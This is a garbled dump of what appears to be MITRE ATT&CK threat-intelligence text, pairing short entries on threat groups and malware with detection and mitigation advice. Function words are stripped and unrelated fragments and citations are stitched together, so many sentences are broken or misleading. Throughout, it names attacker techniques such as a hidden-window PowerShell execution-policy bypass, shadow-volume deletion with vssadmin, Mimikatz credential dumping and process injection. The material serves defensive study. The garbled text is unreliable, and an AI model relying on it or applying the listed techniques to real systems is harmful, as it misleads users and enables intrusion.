specific domains benign registration resolution common occurrence internet. [APT28](https://attack.mitre.org/groups/G0007) variety public exploits, including CVE 2020-0688 CVE 2020-17144, gain execution vulnerable Exchange; conducted SQL injection attacks external websites.(Citation: District Court Indictment GRU Oct 2018)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) Monitor API calls attempt running processes system.  [Tasklist](https://attack.mitre.org/software/S0057) discover processes running system.(Citation: Tasklist) [LitePower](https://attack.mitre.org/software/S0680) determine current user admin privileges.(Citation: Kaspersky WIRTE November 2021) [RainyDay](https://attack.mitre.org/software/S0629) C2 communications.(Citation: Bitdefender Naikon April 2021) Adversaries [NETEAGLE](https://attack.mitre.org/software/S0034) establish RDP connection controller TCP/7519. [LiteDuke](https://attack.mitre.org/software/S0513) ability discover proxy configuration Firefox Opera.(Citation: ESET Dukes October 2019) [CrossRAT](https://attack.mitre.org/software/S0235) creates Launch Agent macOS.(Citation: Lookout Dark Caracal Jan 2018) [APT37](https://attack.mitre.org/groups/G0067) leverages social networking sites cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, Box) C2.(Citation: FireEye APT37 Feb 2018)(Citation: Talos Group123) [Fox Kitten](https://attack.mitre.org/groups/G0117) searched local resources access sensitive documents.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [WellMess](https://attack.mitre.org/software/S0514) execute PowerShell scripts received C2.(Citation: PWC WellMess July 2020)(Citation: CISA WellMess July 2020) [Tropic Trooper](https://attack.mitre.org/groups/G0081) communication C2.(Citation: Anomali Pirate Panda April 2020)(Citation: TrendMicro Tropic Trooper 2020) Policy configure block modifications service critical server parameters Registry.(Citation: Services Fundamentals) Monitoring Windows API calls indicative types code injection generate data defense collected specific circumstances bad sequences calls, benign API functions common difficult distinguish malicious behavior. Windows API calls <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, modify memory process, <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, technique.(Citation: Elastic Process Injection July 2017) Ensure unnecessary ports services closed prevent risk discovery potential exploitation. Monitor hybrid identity solution loading unauthorized DLLs. example, monitor PTA agent servers creation DLLs loading DLLs `AzureADConnectAuthenticationAgentService` process.(Citation: Mandiant Azure Backdoors) FS use, monitor FS server creation DLLs loading unrecognized unsigned DLLs `Microsoft.IdentityServer.Servicehost` application.(Citation: MagicWeb) Monitor unexpected modifications file timestamps  [Taidoor](https://attack.mitre.org/software/S0011) POST requests C2.(Citation: TrendMicro Taidoor) [InnaputRAT](https://attack.mitre.org/software/S0259) gathers volume drive information.(Citation: ASERT InnaputRAT April 2018) [Sidewinder](https://attack.mitre.org/groups/G0121) base64 encoding ECDH-P256 encryption scripts files.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)(Citation: Cyble Sidewinder September 2020) [SHOTPUT](https://attack.mitre.org/software/S0063) command directory listing.(Citation: Palo Alto CVE-2015-3113 July 2015) [Empire](https://attack.mitre.org/software/S0363) ZIP directories target system.(Citation: Github PowerShell Empire) Monitor newly constructed network connections cloud services abnormal non-browser processes. main [CozyCar](https://attack.mitre.org/software/S0046) dropper checks victim anti-virus product installed. installed product predetermined list, dropper exit.(Citation: F-Secure CozyDuke) [BadPatch](https://attack.mitre.org/software/S0337) stores collected data log files exfiltration.(Citation: Unit 42 BadPatch Oct 2017) [PoshC2](https://attack.mitre.org/software/S0378) Invoke-RunAs tokens.(Citation: GitHub PoshC2) [Sakula](https://attack.mitre.org/software/S0074) capability download files.(Citation: Dell Sakula) [MESSAGETAP](https://attack.mitre.org/software/S0443) libpcap library listen traffic parses network protocols starting Ethernet IP layers. continues parsing protocol layers including SCTP, SCCP, TCAP finally extracts SMS message data routing metadata.  (Citation: FireEye MESSAGETAP October 2019) [Hancitor](https://attack.mitre.org/software/S0499) verclsid.exe download execute malicious script.(Citation: Red Canary Verclsid.exe) [TeamTNT](https://attack.mitre.org/groups/G0139) malware adds cryptocurrency miners service.(Citation: ATT TeamTNT Chimaera September 2020) [FIN8](https://attack.mitre.org/groups/G0061) harvests credentials Invoke-Mimikatz Windows Credentials Editor (WCE).(Citation: FireEye Enemy FIN8 Aug 2016) [DarkWatchman](https://attack.mitre.org/software/S0673) delete shadow volumes <code>vssadmin.exe</code>.(Citation: Prevailion DarkWatchman 2021) [APT19](https://attack.mitre.org/groups/G0073) malware variant Port 22 malware variant collect victim’s username.(Citation: Unit 42 C0d0so0 Jan 2016) [SMOKEDHAM](https://attack.mitre.org/software/S0649) modified registry persistence, enable credential caching credential access, facilitate lateral movement RDP.(Citation: FireEye SMOKEDHAM June 2021) [Melcoz](https://attack.mitre.org/software/S0530) MSI files embedded VBScript execution.(Citation: Securelist Brazilian Banking Malware July 2020) [Silent Librarian](https://attack.mitre.org/groups/G0122) searched victim's websites identify academic targeted individuals scrape source code, branding, organizational contact phishing pages.(Citation: DOJ Iran Indictments March 2018)(Citation: Phish Labs Silent Librarian)(Citation: Proofpoint TA407 September 2019) [Turla](https://attack.mitre.org/groups/G0010) surveys check-in discover Policy details <code>gpresult</code> command.(Citation: ESET ComRAT 2020) [Turla](https://attack.mitre.org/groups/G0010) surveys check-in discover active local network connections <code>netstat -an</code>, <code>net use</code>, <code>net file</code>, <code>net session</code> commands.(Citation: Kaspersky Turla)(Citation: ESET ComRAT 2020) [Turla](https://attack.mitre.org/groups/G0010) RPC backdoors enumerated IPv4 TCP connection table <code>GetTcpTable2</code> API call.(Citation: ESET Turla PowerShell 2019) Monitor Registry LSA Registry keys. Windows 8.1 Windows Server 2012 R2 generate events unsigned DLLs load LSA setting Registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</code> AuditLevel = 8. (Citation: Graeber 2014) (Citation: Configure LSA) [Pillowmint](https://attack.mitre.org/software/S0517) stored malicious payload registry key <code>HKLM\SOFTWARE\Microsoft\DRM</code>.(Citation: Trustwave Pillowmint June 2020) [WINERACK](https://attack.mitre.org/software/S0219) enumerate files directories.(Citation: FireEye APT37 Feb 2018) Monitor commands arguments (such common command-line editors) modify plist files, commonly abused files <code>\~/LaunchAgents</code>, <code>\~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>, application's <code>Info.plist</code>. (Citation: ESET PipeMon 2020) [PoetRAT](https://attack.mitre.org/software/S0428) ability files download/upload files C2 channels FTP HTTPS.(Citation: Talos PoetRAT April 2020)(Citation: Talos PoetRAT October 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) scheduled tasks establish persistence.(Citation: DFIR Report APT35 ProxyShell March 2022) [Koadic](https://attack.mitre.org/software/S0250) command <code>Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden</code> hide window.(Citation: MalwareBytes LazyScripter Feb 2021) [Kazuar](https://attack.mitre.org/software/S0265) overwrite files random data deleting them.(Citation: Unit 42 Kazuar 2017) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) gather list processes running machine.(Citation: ClearSky Lebanese Cedar Jan 2021)  [Xbash](https://attack.mitre.org/software/S0341) create Startup item persistence determines Windows system.(Citation: Unit42 Xbash Sept 2018) [ZxShell](https://attack.mitre.org/software/S0412) C2 connections.(Citation: Talos ZxShell Oct 2014)  [Machete](https://attack.mitre.org/software/S0409) retrieves user profile data browsers) Chrome Firefox browsers.(Citation: ESET Machete July 2019)  [PLATINUM](https://attack.mitre.org/groups/G0068) attempted users malicious files sending spearphishing emails attachments victims.(Citation: PLATINUM April 2016) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols malware families versions. Adversaries change tool signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) Monitor newly constructed WMI Objects establish persistence elevate privileges mechanisms trigger execution based specific events. service necessary, lock critical enclaves separate WinRM accounts permissions. (Citation: Checkpoint MosesStaff Nov 2021) [SHOTPUT](https://attack.mitre.org/software/S0063) command retrieve connected users.(Citation: Palo Alto CVE-2015-3113 July 2015) Monitor API calls folders drives shared remote systems identifying sources gather precursor Collection identify potential systems Lateral Movement. [GeminiDuke](https://attack.mitre.org/software/S0049) collects running processes environment variables victim.(Citation: F-Secure Dukes) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors relied potential victims malicious Word document email.(Citation: Cylance Dust Storm) [Bonadan](https://attack.mitre.org/software/S0486) XOR-encrypt C2 communications.(Citation: ESET ForSSHe December 2018) [Bandook](https://attack.mitre.org/software/S0234) capable spawning Windows command shell.(Citation: EFF Manul Aug 2016)(Citation: CheckPoint Bandook Nov 2020) [RATANKBA](https://attack.mitre.org/software/S0241) cmd.exe execute commands.(Citation: Lazarus RATANKBA)(Citation: RATANKBA) [APT29](https://attack.mitre.org/groups/G0016) WMI event subscriptions persistence.(Citation: Mandiant Easy Breach)(Citation: ESET Dukes October 2019)(Citation: 365 Defender Solorigate)(Citation: Deep Dive Solorigate January 2021) [PipeMon](https://attack.mitre.org/software/S0501) stored encrypted payload Registry.(Citation: ESET PipeMon 2020) [VBShower](https://attack.mitre.org/software/S0442) ability execute VBScript files.(Citation: Kaspersky Cloud Atlas August 2019) Monitor newly executed processes, [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001) , arguments enumerate email addresses accounts. [BITSAdmin](https://attack.mitre.org/software/S0190) create [BITS Jobs](https://attack.mitre.org/techniques/T1197) upload download files SMB file servers.(Citation: BITS) [CopyKittens](https://attack.mitre.org/groups/G0052) AirVPN service operational activity.(Citation: POLONIUM June 2022) [Lucifer](https://attack.mitre.org/software/S0532) perform decremental-xor encryption initial C2 request sending wire.(Citation: Unit 42 Lucifer June 2020) [Leviathan](https://attack.mitre.org/groups/G0065) compromised social media accounts conduct social engineering attacks.(Citation: CISA AA21-200A APT40 July 2021) Monitor newly constructed visual content internal external enterprise networks.  [DustySky](https://attack.mitre.org/software/S0062) delete files creates infected system.(Citation: Kaspersky MoleRATs April 2019) [SUNSPOT](https://attack.mitre.org/software/S0562) modified security token grants debugging privileges adding <code>SeDebugPrivilege</code>.(Citation: CrowdStrike SUNSPOT Implant January 2021) [gh0st RAT](https://attack.mitre.org/software/S0032) download files victim’s machine.(Citation: Nccgroup Gh0st April 2018)(Citation: Gh0stRAT ATT March 2019) [Lokibot](https://attack.mitre.org/software/S0447) process hollowing inject legitimate Windows process.(Citation: Infoblox Lokibot January 2019)(Citation: Talos Lokibot Jan 2021)  Patch deployment systems regularly prevent potential remote access [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068). disabling emond removing [Launch Daemon](https://attack.mitre.org/techniques/T1160) plist file. Ensure Driver Signature Enforcement enabled restrict unsigned drivers installed.  [Thrip](https://attack.mitre.org/groups/G0076) leveraged PowerShell commands download payloads, traverse compromised networks, carry reconnaissance.(Citation: Symantec Thrip June 2018) Monitor newly constructed files unusual accounts normal administration duties [FIN10](https://attack.mitre.org/groups/G0051) deployed Meterpreter stagers SplinterRAT instances victim network moving laterally.(Citation: FireEye FIN10 June 2017) [OwaAuth](https://attack.mitre.org/software/S0072) captures DES-encrypts credentials writing username password log file, <code>C:\log.txt</code>.(Citation: Dell TG-3390) [Denis](https://attack.mitre.org/software/S0354) decrypt strings C&C communication.(Citation: Cybereason Cobalt Kitty 2017) [Hildegard](https://attack.mitre.org/software/S0601) deleted scripts execution.(Citation: Unit 42 Hildegard Malware)  [Caterpillar WebShell](https://attack.mitre.org/software/S0572) module collect local database.(Citation: ClearSky Lebanese Cedar Jan 2021)  module [Prikormka](https://attack.mitre.org/software/S0113) collects printers disk drives.(Citation: ESET Operation Groundbait) [GravityRAT](https://attack.mitre.org/software/S0237) time system.(Citation: Talos GravityRAT) [Action RAT](https://attack.mitre.org/software/S1028) communicate C2 servers.(Citation: MalwareBytes SideCopy Dec 2021) [BoomBox](https://attack.mitre.org/software/S0635) ability download stage malware components compromised system.(Citation: MSTIC Nobelium Toolset 2021) [NETWIRE](https://attack.mitre.org/software/S0198) custom encryption algorithm encrypt collected data.(Citation: FireEye NETWIRE March 2019) [Kimsuky](https://attack.mitre.org/groups/G0094) exploited vulnerabilities initial access, including Exchange vulnerability CVE-2020-0688.(Citation: KISA Operation Muzabi) (Citation: FireEye APT33 Guardrail)(Citation: Holmium June 2020) [Carberp](https://attack.mitre.org/software/S0484) start remote VNC session downloading plugin.(Citation: Prevx Carberp March 2011) [Cobalt Strike](https://attack.mitre.org/software/S0154) Profiler discover applications browser identify version Java target has.(Citation: Cobalt Strike Manual 4.3 November 2020) [Fox Kitten](https://attack.mitre.org/groups/G0117) created KeyBase accounts communicate ransomware victims.(Citation: ClearSky Pay2Kitten December 2020)(Citation: Check Pay2Key November 2020) [Elise](https://attack.mitre.org/software/S0081) executes <code>ipconfig /all</code> initial communication remote server.(Citation: Lotus Blossom Jun 2015)(Citation: Accenture Dragonfish Jan 2018) Monitor process accessed acquire user credentials third-party password managers.(Citation: ise Password Manager February 2019) [SamSam](https://attack.mitre.org/software/S0370) custom batch scripts execute components.(Citation: Sophos SamSam Apr 2018) Monitor newly constructed processes command-lines  execute /etc/rc.local present. Monitoring Windows API calls indicative types code injection generate data defense collected specific circumstances. bad sequence calls, benign API functions common difficult distinguish malicious behavior. Windows API calls <code>WriteProcessMemory()</code> <code>NtQueryInformationProcess()</code> parameter set <code>ProcessBasicInformation</code> technique.(Citation: Lazarus APT January 2022) [Bad Rabbit](https://attack.mitre.org/software/S0606) drops file named <code>infpub.dat</code>into Windows directory executed SCManager <code>rundll.exe</code>. [CoinTicker](https://attack.mitre.org/software/S0369) initially downloads hidden encoded file.(Citation: CoinTicker 2019) (Citation: FireEye Clandestine Fox 2) [Indrik Spider](https://attack.mitre.org/groups/G0119) win32_service WMI class retrieve list services system.(Citation: Symantec WastedLocker June 2020)  [RegDuke](https://attack.mitre.org/software/S0511) download files C2.(Citation: ESET Dukes October 2019) [FIN7](https://attack.mitre.org/groups/G0046) conducted broad phishing campaigns malicious links.(Citation: CrowdStrike Carbon Spider August 2021) [InvisiMole](https://attack.mitre.org/software/S0260) lnk file Startup Folder achieve persistence.(Citation: ESET InvisiMole June 2020) [Donut](https://attack.mitre.org/software/S0695) generate shellcode outputs execute Ruby.(Citation: Donut Github)	 [BoxCaon](https://attack.mitre.org/software/S0651) Windows API calls compromised host.(Citation: Checkpoint IndigoZebra July 2021) [DarkWatchman](https://attack.mitre.org/software/S0673) stage local data Windows Registry.(Citation: Prevailion DarkWatchman 2021) [APT29](https://attack.mitre.org/groups/G0016) Registry establish persistence.(Citation: Mandiant Easy Breach) [Andariel](https://attack.mitre.org/groups/G0138) collected files compromised network systems extraction.(Citation: FSI Andariel Campaign Rifle July 2017) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors relied victim malicious link distributed phishing emails.(Citation: ESET Operation Spalax Jan 2021) [Carbon](https://attack.mitre.org/software/S0335) <code>netstat -r</code> <code>netstat -an</code> commands.(Citation: GovCERT Carbon 2016) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool command control signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) [Bandook](https://attack.mitre.org/software/S0234) keylogging capabilities.(Citation: Manul Aug 2016) [Pillowmint](https://attack.mitre.org/software/S0517) shellcode reads code stored registry <code>\REGISTRY\SOFTWARE\Microsoft\DRM</code> native Windows API read <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces</code> C2.(Citation: Trustwave Pillowmint June 2020)	 [Exaramel Windows](https://attack.mitre.org/software/S0343) command execute VBS scripts victim’s machine.(Citation: ESET TeleBots Oct 2018) Monitor network traffic content files malicious content, data coming abnormal/unknown domain IPs. [RARSTONE](https://attack.mitre.org/software/S0055) SSL encrypt communication C2 server.(Citation: Aquino RARSTONE) Monitor investigate attempts modify extended file attributes utilities as <code>xattr</code>. Built-in utilities generate false positive alerts, compare baseline knowledge systems typically correlate modification events indications malicious activity possible.  [Epic](https://attack.mitre.org/software/S0091) command delete file machine.(Citation: Kaspersky Turla Aug 2014) [Turla](https://attack.mitre.org/groups/G0010) RPC backdoors APIs calls tasks subverting AMSI accessing executing commands RPC named pipes.(Citation: ESET Turla PowerShell 2019) [Shark](https://attack.mitre.org/software/S1019) ability `CMD` execute commands.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) Monitor newly constructed user accounts account audits detect suspicious accounts created adversary. Collect data account creation network Windows Event 4720 (for user account created Windows domain controller). [Bumblebee](https://attack.mitre.org/software/S1039) deobfuscate C2 server responses unpack code targeted hosts.(Citation: Proofpoint Bumblebee April 2022)(Citation: Medium Ali Salem Bumblebee April 2022) [Bonadan](https://attack.mitre.org/software/S0486) discovered OS version, CPU model, RAM size installed on.(Citation: ESET ForSSHe December 2018) [KONNI](https://attack.mitre.org/software/S0356) packed obfuscation.(Citation: Malwarebytes KONNI Evolves Jan 2022) [Ragnar Locker](https://attack.mitre.org/software/S0481) sc.exe execute service creates.(Citation: Sophos Ragnar 2020) [Final1stspy](https://attack.mitre.org/software/S0355) Python code deobfuscate base64-encoded strings.(Citation: Unit 42 Nokki Oct 2018) [RDAT](https://attack.mitre.org/software/S0495) executed commands <code>cmd.exe /c</code>.(Citation: Unit42 RDAT July 2020)	 Monitor newly constructed network connections Valid Accounts access persist network External Remote Services. External Remote Services legitimate depending environment it’s used. factors, access patterns activity occurs remote login, suspicious malicious behavior External Remote Services. Monitor executed commands arguments establish persistence elevate privileges executing malicious content triggered AppInit DLLs loaded processes. [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) capability enumerate services.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [SILENTTRINITY](https://attack.mitre.org/software/S0692) enumerate shares compromised host.(Citation: GitHub SILENTTRINITY Modules July 2019) [Octopus](https://attack.mitre.org/software/S0340) collect username victim’s machine.(Citation: Securelist Octopus Oct 2018) [Meteor](https://attack.mitre.org/software/S0688) disguised Windows Power Efficiency Diagnostics report tool.(Citation: Check Meteor Aug 2021) Monitor files disable services render services unavailable legitimate users. [ftp](https://attack.mitre.org/software/S0095) abused adversaries transfer tools files systems compromised environment.(Citation: FTP)(Citation: Linux FTP) [IcedID](https://attack.mitre.org/software/S0483) ability identify Workgroup membership.(Citation: IBM IcedID November 2017) [Avaddon](https://attack.mitre.org/software/S0640) attempts anti-malware solutions.(Citation: Arxiv Avaddon Feb 2021) [Astaroth](https://attack.mitre.org/software/S0373) malicious VBS e-mail attachments execution.(Citation: Securelist Brazilian Banking Malware July 2020) [Mustang Panda](https://attack.mitre.org/groups/G0129)'s [PlugX](https://attack.mitre.org/software/S0013) variant created hidden folder USB drives named <code>RECYCLE.BIN</code> store malicious executables collected data.(Citation: Avira Mustang Panda January 2020) [Stolen Pencil](https://attack.mitre.org/groups/G0086) tool add Windows admin account ensure continued access RDP. (Citation: Netscout Stolen Pencil Dec 2018) [HAMMERTOSS](https://attack.mitre.org/software/S0037) controlled commands appended image files.(Citation: FireEye APT29) [DEATHRANSOM](https://attack.mitre.org/software/S0616) public private key pair encryption encrypt files ransom payment.(Citation: FireEye FiveHands April 2021) [SMOKEDHAM](https://attack.mitre.org/software/S0649) created user accounts local Admin groups.(Citation: FireEye SMOKEDHAM June 2021) [Chimera](https://attack.mitre.org/groups/G0114) dumped password hashes pass hash authentication attacks.(Citation: NCC Chimera January 2021) [Calisto](https://attack.mitre.org/software/S0274) runs <code>ifconfig</code> command IP address victim’s machine.(Citation: Securelist Calisto July 2018) [NDiskMonitor](https://attack.mitre.org/software/S0272) download execute file URL.(Citation: TrendMicro Patchwork Dec 2017) [Taidoor](https://attack.mitre.org/software/S0011) RC4 encrypt message body content.(Citation: TrendMicro Taidoor)(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) Monitor publicly writeable directories, central locations, commonly staging directories (recycle bin, temp folders, etc.) regularly check compressed encrypted data indicative staging. [Hi-Zor](https://attack.mitre.org/software/S0087) encrypts C2 traffic double XOR distinct single-byte keys.(Citation: Fidelis Hi-Zor) (Citation: NEODYMIUM Dec 2016)(Citation: SIR 21) [ROADTools](https://attack.mitre.org/software/S0684) automatically gathers data Azure environments Azure Graph API.(Citation: Roadtools) Enforce execution signed PowerShell scripts. Sign profiles avoid modified.  Monitor unusual kernel driver installation activity corrupt wipe disk data structures hard drive boot system; targeting specific critical systems network interrupt availability network resources. [Metamorfo](https://attack.mitre.org/software/S0455) YouTube store hide C&C server domains.(Citation: ESET Casbaneiro Oct 2019) Remote access tools built-in features interact Windows API perform functions typical utilities. example, <code>ChangeServiceConfigW</code> adversary prevent services starting.(Citation: Talos Olympic Destroyer 2018) [menuPass](https://attack.mitre.org/groups/G0045) modified open-source tools [Impacket](https://attack.mitre.org/software/S0357), [Mimikatz](https://attack.mitre.org/software/S0002), [pwdump](https://attack.mitre.org/software/S0006).(Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: Amnesty Intl. Ocean Lotus February 2021)(Citation: Unit 42 KerrDown February 2019) [Taidoor](https://attack.mitre.org/software/S0011) ability native APIs execution including <code>GetProcessHeap</code>, <code>GetProcAddress</code>, <code>LoadLibrary</code>.(Citation: TrendMicro Taidoor)(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [AppleJeus](https://attack.mitre.org/software/S0584) install service.(Citation: CISA AppleJeus Feb 2021)  technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Cyclops Blink](https://attack.mitre.org/software/S0687) ability query device information.(Citation: NCSC Cyclops Blink February 2022) [menuPass](https://attack.mitre.org/groups/G0045) attempted victims malicious files Windows Shortcuts (.lnk) Office documents, email spearphishing campaigns.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 2017)(Citation: Accenture Hogfish April 2018)(Citation: FireEye APT10 Sept 2018)(Citation: District Court NY APT10 Indictment December 2018) [StrongPity](https://attack.mitre.org/software/S0491) identify IP address compromised host.(Citation: Talos Promethium June 2020) (Citation: Proofpoint TA505 October 2019) [Ebury](https://attack.mitre.org/software/S0377) disable SELinux Role-Based Access Control deactivate PAM modules.(Citation: ESET Ebury Oct 2017) Ensure certificate authorities (CA) properly secured, including treating servers (and resources hosting certificates) tier 0 assets. Harden abusable settings attributes.

For example, disabling usage certificate SANs relevant authentication protocol settings enforce strict user mappings prevent certificates authenticating identifies.(Citation: SpecterOps Certified Pre Owned) enforcing Certificate Manager approval templates include SAN issuance requirement. [More_eggs](https://attack.mitre.org/software/S0284) cmd.exe execution.(Citation: Security Intelligence Eggs Aug 2019)(Citation: ESET EvilNum July 2020) [ROKRAT](https://attack.mitre.org/software/S0240) steal credentials stored browsers querying sqlite database.(Citation: Talos Group123) [Ke3chang](https://attack.mitre.org/groups/G0004) deobfuscated Base64-encoded shellcode strings prior loading them.(Citation: NICKEL December 2021) [OilRig](https://attack.mitre.org/groups/G0049) CHM payload load execute malicious file delivered victim.(Citation: Palo Alto OilRig 2016) (Citation: US-CERT HOPLIGHT Apr 2019) [BBSRAT](https://attack.mitre.org/software/S0127) compress data ZLIB prior sending C2 server.(Citation: Palo Alto Networks BBSRAT) [Helminth](https://attack.mitre.org/software/S0170) establishes persistence creating shortcut.(Citation: Palo Alto OilRig 2016) [BoomBox](https://attack.mitre.org/software/S0635) decrypt AES-encrypted files downloaded C2.(Citation: MSTIC Nobelium Toolset 2021) [POWRUNER](https://attack.mitre.org/software/S0184) WMI collecting victim.(Citation: FireEye APT34 Dec 2017) multi-factor authentication user privileged accounts. embedded network devices support TACACS+ RADIUS.  Follow vendor prescribed practices hardening access control.(Citation: Cisco IOS Software Integrity Assurance - TACACS) settings prevent applications running downloaded legitimate repositories mitigate issues. allowing unsigned applications mitigate risk. [TA551](https://attack.mitre.org/groups/G0127) prompted users enable macros spearphishing attachments install malware.(Citation: Unit 42 TA551 Jan 2021) suspicious account behavior systems share accounts, user, admin, service accounts. Examples: account logged multiple systems simultaneously; multiple accounts logged machine simultaneously; accounts logged odd times business hours. Activity interactive login sessions process ownership accounts execute binaries remote account. Monitor executed commands arguments suspicious commands modify accounts account settings (including files `authorized_keys` `/etc/ssh/sshd_config`).

Monitor executed commands arguments suspicious commands (such `Add-MailboxPermission`) indicative modifying permissions Exchange service settings. [StrongPity](https://attack.mitre.org/software/S0491) exfiltrate collected documents C2 channels.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) Windows 10, enable Attack Surface Reduction (ASR) rules prevent executable files running meet prevalence, age, trusted list criteria prevent Office applications creating malicious executable content blocking malicious code written disk. Note: cloud-delivered protection enabled rules. (Citation: win10_asr) [Threat Group-3390](https://attack.mitre.org/groups/G0027) tool read decrypt stored Registry values.(Citation: Nccgroup Emissary Panda 2018) (Citation: Securelist APT10 March 2021) Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility software targeted defense evasion. [Nomadic Octopus](https://attack.mitre.org/groups/G0133) <code>cmd.exe /c</code> malicious macro.(Citation: ESET Nomadic Octopus 2018) [Gamaredon Group](https://attack.mitre.org/groups/G0047) delivered spearphishing emails malicious attachments targets.(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: CERT-EE Gamaredon January 2021)(Citation: Actinium February 2022)(Citation: Unit 42 Gamaredon February 2022)(Citation: Secureworks IRON TILDEN Profile) [NETEAGLE](https://attack.mitre.org/software/S0034) capable reading files C2 channel.(Citation: FireEye APT30) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors DLL files invalid certificates.(Citation: DFIR Conti Bazar Nov 2021) [Volgmer](https://attack.mitre.org/software/S0180) gather information, name, OS version, drive serial victim's machine.(Citation: US-CERT Volgmer Nov 2017)(Citation: US-CERT Volgmer 2 Nov 2017)(Citation: Symantec Volgmer Aug 2014) [Chinoxy](https://attack.mitre.org/software/S1041) dropping function initiate decryption config file.(Citation: Bitdefender FunnyDream Campaign November 2020) (Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021)(Citation: Secureworks GOLD CABIN) monitoring accesses modifications local storage repositories (such Windows Registry), suspicious processes malicious data collection. [Cardinal RAT](https://attack.mitre.org/software/S0348) checks current directory execution watchdog functionality ensures executable located correct path (else rewrite payload).(Citation: PaloAlto CardinalRat Apr 2017) (Citation: Trend Micro Muddy Water March 2021) [AppleSeed](https://attack.mitre.org/software/S0622) distributed victims malicious e-mail attachments.(Citation: Malwarebytes Kimsuky June 2021) [OwaAuth](https://attack.mitre.org/software/S0072) command list directory logical drives.(Citation: Dell TG-3390) [FIVEHANDS](https://attack.mitre.org/software/S0618) receive command argument limit file encryption directories.(Citation: FireEye FiveHands April 2021)(Citation: NCC Fivehands June 2021) auditing tools capable detecting file permissions abuse opportunities systems enterprise correct them. Toolkits PowerSploit framework PowerUp modules explore systems service file permissions weaknesses. (Citation: Powersploit) [LitePower](https://attack.mitre.org/software/S0680) ability download payloads commands compromised host.(Citation: Kaspersky WIRTE November 2021) [Carbon](https://attack.mitre.org/software/S0335) enumerates values Registry.(Citation: ESET Carbon Mar 2017) Detecting hidden file exceptionally difficult depending implementation. Emphasis detecting aspects adversary lifecycle, malware interacts hidden file hidden file loaded. (Citation: Symantec Waterbug)(Citation: Unit 42 IronNetInjector February 2021 )(Citation: Secureworks IRON HUNTER Profile) [Poseidon Group](https://attack.mitre.org/groups/G0033) conducts credential dumping victims, focus obtaining credentials belonging domain database servers.(Citation: Kaspersky Poseidon Group) Monitor newly constructed files abuse task scheduling functionality facilitate initial recurring execution malicious code. [Pteranodon](https://attack.mitre.org/software/S0147) download execute additional files.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: Symantec Shuckworm January 2022)(Citation: Unit 42 Gamaredon February 2022) [Magic Hound](https://attack.mitre.org/groups/G0059) malware communicated C2 server ports 4443 3543.(Citation: Unit 42 Magic Hound Feb 2017) [ServHelper](https://attack.mitre.org/software/S0382) set reverse SSH tunnel attacker access services running victim, RDP.(Citation: Proofpoint TA505 Jan 2019) [SUGARUSH](https://attack.mitre.org/software/S1049) checked internet connectivity infected host attempting establish TCP connection.(Citation: Mandiant UNC3890 Aug 2022) [TeamTNT](https://attack.mitre.org/groups/G0139) uploaded backdoored Docker images Docker Hub.(Citation: Lacework TeamTNT 2021) [TinyZBot](https://attack.mitre.org/software/S0004) functionality collect clipboard.(Citation: Cylance Cleaver) [CORESHELL](https://attack.mitre.org/software/S0137) C2 messages Base64-encoded.(Citation: FireEye APT28) Monitor file names mismatched file disk binary's metadata, indicator binary renamed compiled.  [Koadic](https://attack.mitre.org/software/S0250) gather hashed passwords dumping SAM/SECURITY hive.(Citation: Github Koadic) [Egregor](https://attack.mitre.org/software/S0554) BITSadmin download execute malicious DLLs.(Citation: Intrinsec Egregor Nov 2020) [RARSTONE](https://attack.mitre.org/software/S0055) obtains installer properties Uninstall Registry Key entries installed applications uninstall applications.(Citation: Camba RARSTONE) [FALLCHILL](https://attack.mitre.org/software/S0181) encrypts C2 data RC4 encryption.(Citation: US-CERT FALLCHILL Nov 2017)(Citation: CISA AppleJeus Feb 2021) Monitor logging, messaging disable Windows event logging limit data leveraged detections audits. [SDelete](https://attack.mitre.org/software/S0195) deletes data unrecoverable.(Citation: SDelete July 2016) [GCMAN](https://attack.mitre.org/groups/G0036) VNC lateral movement.(Citation: Securelist GCMAN) [APT41](https://attack.mitre.org/groups/G0096) tools [Mimikatz](https://attack.mitre.org/software/S0002), 